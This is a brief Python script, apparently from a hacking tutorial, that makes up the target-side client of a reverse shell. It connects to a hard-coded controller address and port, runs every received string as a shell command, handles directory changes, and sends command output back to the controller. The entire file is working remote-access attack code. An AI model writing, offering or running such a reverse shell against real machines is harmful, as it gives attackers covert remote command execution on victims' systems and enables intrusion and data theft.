import os # to control operating system of target machine
import socket # to connect to socket
import subprocess #

s = socket.socket() # the socket for conversation between the server and target machine
host = '10.0.0.6'
port = 9999
s.connect((host, port))

# listen to instructions
while True:
    data = s.recv(1024) # 1024 = buffer size
    if data[:2].decode("utf-8") == "cd":  # checks if the first two letters of the command are 'cd', we get them in bytes, need to decode to string
        os.chdir(data[3:].decode("utf-8")) # go to given directory
    # if it's not 'cd' and it's not blank at all (like pressed enter by mistake)
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE , stderr=subprocess.PIPE, stdin= subprocess.PIPE) # run a command in the terminal
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes,"utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + '>'))

#close connection
s.close()
